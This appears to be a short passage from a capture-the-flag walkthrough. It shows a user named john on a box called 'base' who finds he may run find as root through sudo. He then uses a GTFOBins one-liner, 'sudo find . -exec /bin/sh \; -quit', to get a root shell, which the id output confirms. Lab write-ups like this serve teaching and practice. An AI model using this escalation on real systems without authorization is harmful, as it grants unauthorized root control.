SSH as john with `th<SNIP>rd`

## john
```
john@base:/tmp/ignore$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find

```

Courtesy of GTFOBins...
https://gtfobins.github.io/gtfobins/find/#shell

```
john@base:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# 


```